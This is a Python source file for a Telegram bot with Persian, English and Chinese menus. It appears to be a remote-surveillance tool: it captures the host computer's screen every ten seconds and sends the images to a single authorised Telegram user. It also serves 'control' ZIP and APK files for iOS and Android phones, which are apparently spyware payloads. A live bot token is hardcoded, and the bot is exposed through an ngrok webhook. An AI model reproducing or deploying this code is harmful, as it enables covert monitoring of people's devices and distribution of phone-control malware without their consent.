import telebot
from flask import Flask, request
import psutil
import os
import subprocess
import pyautogui
import threading
import time

API_TOKEN = '8104189481:AAHeedHcOE55SbQztotuYS9aFGmtR5OjLLQ'
bot = telebot.TeleBot(API_TOKEN)

# شناسه کاربر مجاز
AUTHORIZED_USER_ID = 6039161038

# راه‌اندازی سرور Flask
app = Flask(__name__)

# متغیر وضعیت عملیات
operation_in_progress = False
current_operation = None

# دیکشنری برای ذخیره زبان هر کاربر
user_languages = {}

# دیکشنری متون به زبان‌های مختلف
messages = {
    'fa': {
        'welcome': "سلام! چه کاری می‌خواهید انجام دهید؟",
        'unauthorized': "شما مجاز به استفاده از این ربات نیستید.",
        'control_phone': "لطفاً نوع دستگاه خود را انتخاب کنید:",
        'control_phone_iOS': "در حال آماده‌سازی فایل کنترل iOS برای شما...",
        'control_phone_Android_photo': "در حال آماده‌سازی فایل کنترل با عکس برای Android...",
        'control_phone_Android_app': "در حال آماده‌سازی فایل برنامه کنترل برای Android...",
        'no_running_programs': "هیچ برنامه‌ای در حال اجرا نیست.",
        'running_programs': "برنامه‌های در حال اجرا:\n\n",
        'screenshot_start': "در حال گرفتن اسکرین‌شات هر 10 ثانیه...",
        'screenshot_stop': "اسکرین‌شات متوقف شد.",
        'language_changed_fa': "زبان به فارسی تغییر یافت.",
        'language_changed_en': "Language changed to English.",
        'language_changed_zh': "语言已更改为中文。",
        'back_to_menu': "به منوی اصلی بازگشتید.",
        'contact_support': "برای ارتباط با پشتیبانی به این آیدی پیام دهید: 6039161038",
        'change_language': "زبان مورد نظر خود را انتخاب کنید:",
        'operation_in_progress': "یک عملیات در حال اجرا است. لطفاً انتخاب کنید:",
        'operation_wait': "لطفاً منتظر بمانید تا عملیات فعلی پایان یابد.",
        'operation_cancel': "عملیات لغو شد."
    },
    'en': {
        'welcome': "Hello! What would you like to do?",
        'unauthorized': "You are not authorized to use this bot.",
        'control_phone': "Please select your device type:",
        'control_phone_iOS': "Preparing iOS control file for you...",
        'control_phone_Android_photo': "Preparing photo control file for Android...",
        'control_phone_Android_app': "Preparing app control file for Android...",
        'no_running_programs': "No programs are currently running.",
        'running_programs': "Running programs:\n\n",
        'screenshot_start': "Taking screenshot every 10 seconds...",
        'screenshot_stop': "Screenshot stopped.",
        'language_changed_fa': "Language changed to Persian.",
        'language_changed_en': "Language changed to English.",
        'language_changed_zh': "Language changed to Chinese.",
        'back_to_menu': "You have returned to the main menu.",
        'contact_support': "For support, message this ID: 6039161038",
        'change_language': "Please select your preferred language:",
        'operation_in_progress': "An operation is in progress. Please choose:",
        'operation_wait': "Please wait for the current operation to finish.",
        'operation_cancel': "Operation canceled."
    },
    'zh': {
        'welcome': "你好！你想做什么？",
        'unauthorized': "您无权使用此机器人。",
        'control_phone': "请选择您的设备类型：",
        'control_phone_iOS': "正在为您准备iOS控制文件...",
        'control_phone_Android_photo': "正在为Android准备照片控制文件...",
        'control_phone_Android_app': "正在为Android准备应用控制文件...",
        'no_running_programs': "没有正在运行的程序。",
        'running_programs': "正在运行的程序：\n\n",
        'screenshot_start': "每10秒拍一次屏幕...",
        'screenshot_stop': "截图已停止。",
        'language_changed_fa': "语言已更改为波斯语。",
        'language_changed_en': "Language changed to English.",
        'language_changed_zh': "语言已更改为中文。",
        'back_to_menu': "您已返回主菜单。",
        'contact_support': "如需支持，请发送此ID：6039161038",
        'change_language': "请选择您喜欢的语言：",
        'operation_in_progress': "一个操作正在进行中。请选择：",
        'operation_wait': "请等待当前操作完成。",
        'operation_cancel': "操作已取消。"
    }
}

# دکمه‌های اصلی
def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('📱 کنترل گوشی', '💻 کنترل لب تاب')
    markup.row('🌍 تغییر زبان', '📞 ارتباط با پشتیبانی')
    return markup

# دکمه‌های بخش کنترل گوشی
def phone_control_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('🍎 iOS', '🤖 Android')
    markup.row('🔙 بازگشت به منو')
    return markup

# دکمه‌های بخش Android
def android_control_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('📷 کنترل با عکس', '📱 کنترل با برنامه')
    markup.row('🔙 بازگشت به بخش گوشی')
    return markup

# دکمه‌های تغییر زبان
def language_menu(lang):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    if lang == 'fa':
        markup.row('🇮🇷 فارسی', '🇺🇸 انگلیسی')
        markup.row('🇨🇳 چینی', '🔙 بازگشت به منو')
    elif lang == 'en':
        markup.row('🇮🇷 فارسی', '🇺🇸 English')
        markup.row('🇨🇳 Chinese', '🔙 Back to Menu')
    elif lang == 'zh':
        markup.row('🇮🇷 波斯语', '🇺🇸 英语')
        markup.row('🇨🇳 中文', '🔙 返回主菜单')
    return markup

# توابع مدیریت وضعیت عملیات
def start_operation():
    global operation_in_progress
    operation_in_progress = True

def end_operation():
    global operation_in_progress
    operation_in_progress = False

# شروع ربات
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.chat.id != AUTHORIZED_USER_ID:
        lang = 'fa'  # زبان پیش‌فرض برای کاربران غیرمجاز
        bot.reply_to(message, messages[lang]['unauthorized'])
        return
    user_languages[message.chat.id] = 'fa'  # زبان پیش‌فرض فارسی
    bot.reply_to(message, messages['fa']['welcome'], reply_markup=main_menu())

# مدیریت پیام‌ها بر اساس وضعیت عملیات
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    global operation_in_progress
    lang = user_languages.get(message.chat.id, 'fa')  # زبان پیش‌فرض فارسی

    # اگر عملیات در حال اجرا است و پیام جدیدی دریافت شد
    if operation_in_progress and message.text not in ['🕔 صبر کردن', '❌ لغو عملیات', '🔙 بازگشت به منو', '🔙 بازگشت به بخش گوشی']:
        markup = telebot.types.InlineKeyboardMarkup()
        wait_button = telebot.types.InlineKeyboardButton('🕔 صبر کردن', callback_data='wait')
        cancel_button = telebot.types.InlineKeyboardButton('❌ لغو عملیات', callback_data='cancel')
        markup.add(wait_button, cancel_button)
        bot.reply_to(message, messages[lang]['operation_in_progress'], reply_markup=markup)
        return

    # دستورات اصلی
    if message.text == '📱 کنترل گوشی':
        bot.reply_to(message, messages[lang]['control_phone'], reply_markup=phone_control_menu())

    elif message.text == '💻 کنترل لب تاب':
        bot.reply_to(message, "لطفاً کاری که می‌خواهید انجام دهید را انتخاب کنید:", reply_markup=control_laptop_menu(lang))

    elif message.text == '🌍 تغییر زبان':
        bot.reply_to(message, messages[lang]['change_language'], reply_markup=language_menu(lang))

    elif message.text == '📞 ارتباط با پشتیبانی':
        bot.reply_to(message, messages[lang]['contact_support'])

    elif message.text == '🔙 بازگشت به منو':
        bot.reply_to(message, messages[lang]['back_to_menu'], reply_markup=main_menu())

    elif message.text == '🔙 بازگشت به بخش گوشی':
        bot.reply_to(message, messages[lang]['control_phone'], reply_markup=phone_control_menu())

    # بخش کنترل گوشی
    elif message.text == '🍎 iOS':
        bot.reply_to(message, messages[lang]['control_phone_iOS'])
        # ارسال فایل کنترل iOS
        ios_file_path = "ios_control_file.zip"  # نام فایل کنترل iOS
        if os.path.exists(ios_file_path):
            with open(ios_file_path, 'rb') as ios_file:
                bot.send_document(message.chat.id, ios_file)
        else:
            bot.reply_to(message, "فایل کنترل iOS یافت نشد.")

    elif message.text == '🤖 Android':
        bot.reply_to(message, "لطفاً نوع کنترل Android را انتخاب کنید:", reply_markup=android_control_menu())

    # بخش Android - کنترل با عکس
    elif message.text == '📷 کنترل با عکس':
        bot.reply_to(message, messages[lang]['control_phone_Android_photo'])
        # ارسال فایل کنترل Android با عکس
        android_photo_file_path = "android_photo_control_file.zip"  # نام فایل کنترل Android با عکس
        if os.path.exists(android_photo_file_path):
            with open(android_photo_file_path, 'rb') as android_photo_file:
                bot.send_document(message.chat.id, android_photo_file)
        else:
            bot.reply_to(message, "فایل کنترل Android با عکس یافت نشد.")

    # بخش Android - کنترل با برنامه
    elif message.text == '📱 کنترل با برنامه':
        bot.reply_to(message, messages[lang]['control_phone_Android_app'])
        # ارسال فایل برنامه کنترل Android
        android_app_file_path = "android_app_control_file.apk"  # نام فایل برنامه کنترل Android
        if os.path.exists(android_app_file_path):
            with open(android_app_file_path, 'rb') as android_app_file:
                bot.send_document(message.chat.id, android_app_file)
        else:
            bot.reply_to(message, "فایل برنامه کنترل Android یافت نشد.")

    else:
        bot.reply_to(message, "دستور نامعتبر است.", reply_markup=main_menu())

# منوی کنترل لب تاب بر اساس زبان
def control_laptop_menu(lang):
    if lang == 'fa':
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row('🖼️ شروع اسکرین‌شات', '❌ متوقف کردن اسکرین‌شات')
        markup.row('👁️ مشاهده فعالیت‌ها', '🔙 بازگشت به منو')
    elif lang == 'en':
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row('🖼️ Start Screenshot', '❌ Stop Screenshot')
        markup.row('👁️ Check Activity', '🔙 Back to Menu')
    elif lang == 'zh':
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row('🖼️ 开始截图', '❌ 停止截图')
        markup.row('👁️ 查看活动', '🔙 返回主菜单')
    return markup

# مدیریت کلیک روی گزینه‌ها (صبر یا لغو)
@bot.callback_query_handler(func=lambda call: True)
def handle_operation_options(call):
    global operation_in_progress
    lang = user_languages.get(call.message.chat.id, 'fa')

    if call.data == 'wait':
        bot.answer_callback_query(call.id, messages[lang]['operation_wait'])
    elif call.data == 'cancel':
        if operation_in_progress:
            end_operation()
            bot.answer_callback_query(call.id, messages[lang]['operation_cancel'])
            bot.send_message(call.message.chat.id, messages[lang]['operation_cancel'])
        else:
            bot.answer_callback_query(call.id, "هیچ عملیاتی برای لغو وجود ندارد.")

# مدیریت تغییر زبان
@bot.message_handler(regexp="🇮🇷 فارسی")
def set_farsi(message):
    user_languages[message.chat.id] = 'fa'
    bot.reply_to(message, messages['fa']['language_changed_fa'], reply_markup=main_menu())

@bot.message_handler(regexp="🇺🇸 انگلیسی")
def set_english(message):
    user_languages[message.chat.id] = 'en'
    bot.reply_to(message, messages['en']['language_changed_en'], reply_markup=main_menu())

@bot.message_handler(regexp="🇨🇳 چینی")
def set_chinese(message):
    user_languages[message.chat.id] = 'zh'
    bot.reply_to(message, messages['zh']['language_changed_zh'], reply_markup=main_menu())

# شروع اسکرین‌شات
def take_screenshot(chat_id):
    global screenshot_active
    while screenshot_active:
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(chat_id, photo)
        time.sleep(10)  # هر 10 ثانیه یک بار

screenshot_active = False  # متغیر کنترل اسکرین‌شات


@bot.message_handler(regexp="🖼️ شروع اسکرین‌شات")
def start_screenshot(message):
    global screenshot_active, operation_in_progress
    lang = user_languages.get(message.chat.id, 'fa')
    if operation_in_progress:
        markup = telebot.types.InlineKeyboardMarkup()
        wait_button = telebot.types.InlineKeyboardButton('🕔 صبر کردن', callback_data='wait')
        cancel_button = telebot.types.InlineKeyboardButton('❌ لغو عملیات', callback_data='cancel')
        markup.add(wait_button, cancel_button)
        bot.reply_to(message, messages[lang]['operation_in_progress'], reply_markup=markup)
    else:
        start_operation()
        if not screenshot_active:
            screenshot_active = True
            bot.reply_to(message, messages[lang]['screenshot_start'])
            threading.Thread(target=take_screenshot, args=(message.chat.id,)).start()
        else:
            bot.reply_to(message, messages[lang]['screenshot_stop'])
        end_operation()

@bot.message_handler(regexp="❌ متوقف کردن اسکرین‌شات")
def stop_screenshot(message):
    global screenshot_active, operation_in_progress
    lang = user_languages.get(message.chat.id, 'fa')
    if operation_in_progress:
        markup = telebot.types.InlineKeyboardMarkup()
        wait_button = telebot.types.InlineKeyboardButton('🕔 صبر کردن', callback_data='wait')
        cancel_button = telebot.types.InlineKeyboardButton('❌ لغو عملیات', callback_data='cancel')
        markup.add(wait_button, cancel_button)
        bot.reply_to(message, messages[lang]['operation_in_progress'], reply_markup=markup)
    else:
        start_operation()
        if screenshot_active:
            screenshot_active = False
            bot.reply_to(message, messages[lang]['screenshot_stop'])
        else:
            bot.reply_to(message, "اسکرین‌شات در حال حاضر غیرفعال است.")
        end_operation()

# راه‌اندازی سرور برای دریافت پیام‌ها از تلگرام
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    bot.process_new_updates([telebot.types.Update.de_json(update)])
    return '', 200

# راه‌اندازی ربات با استفاده از webhook
def set_webhook():
    bot.remove_webhook()
    time.sleep(1)
    ngrok_url = 'https://297f-5-237-43-2.ngrok-free.app/webhook'  # جایگزین با URL جدید ngrok
    bot.set_webhook(url=ngrok_url)

if __name__ == '__main__':
    set_webhook()
    app.run(host='0.0.0.0', port=5050)  # پورت 8888
